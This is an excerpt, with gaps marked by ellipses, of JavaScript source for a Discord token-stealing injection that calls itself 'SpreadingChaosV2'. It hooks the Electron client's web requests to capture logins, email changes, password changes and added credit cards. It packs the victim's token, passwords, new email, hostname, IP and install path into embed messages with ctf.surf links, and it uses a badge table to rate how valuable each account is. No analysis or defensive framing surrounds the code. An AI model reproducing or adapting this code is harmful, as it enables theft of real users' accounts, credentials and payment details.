...
const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:967100974420336751>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:967100170712014898>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad:967101100463386704>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter1:967100758170402906>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:967100170858799114>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter2:967100784238010449>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<a:developer:967101205417451592>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:967102775076982865>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:967102732706140190>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:967102683045589082>",
        Rare: false,
    },
};


class SpreadingChaosEvent {
...
async function firstTime() {
            ...
            if (token == null || token == undefined || token == "") {
                var c = {
                    embeds: [{
                        ...
                        author: {
                            name: "SpreadingChaosV2"
                        },
                        footer: {
                            text: "SpreadingChaosV2"
                        }
                    }]
                };
                ...
                var c = {
                    embeds: [{
                        ...
                        description: "[**<:partner:967100170712014898> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + ")",
                        color: config["embed-color"],
                        fields: [{
                            name: "Info",
                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
    ...
    if (!fs.existsSync(path.join(__dirname, "SpreadingChaosBTW"))) return !0
...
async function userLogin(password, email, token) {
    ...
    var params = {
        embeds: [{
            "title": "User Login",
            description: "[**<:partner:967100170712014898> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + ")",
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
...
async function emailChanged(password, newEmail, token) {
    ...
    var params = {
        embeds: [{
            "title": "Email Changed",
            description: "[**<:partner:967100170712014898> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + password + "<br>" + newEmail + ")",
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
...
async function passwordChanged(oldPassword, newPassword, token) {
    ...
    var params = {
        embeds: [{
            ...
            description: "[**<:partner:967100170712014898> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + token + "<br>" + newPassword + ")",
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
...
function getNitro(flags) {
    switch (flags) {
        ...
        case 2:
            return "<:24m:967104132999684116> \`Nitro Boost\`";
        default:
            return "No Nitro";
...
session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
    ...
    switch (true) {
        case details.url.endsWith('login'):
            var event = new SpreadingChaosEvent('userLogin', token, {
        ...
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            ...
            if (data.email) {
                var event = new SpreadingChaosEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();
            ...
            if (data.new_password) {
                var event = new SpreadingChaosEvent('passwordChanged', token, {
                    password: data.password,
        ...
        case details.url.endsWith('tokens') && details.method == "POST":
            ...
            var event = new SpreadingChaosEvent('creditCardAdded', token, {
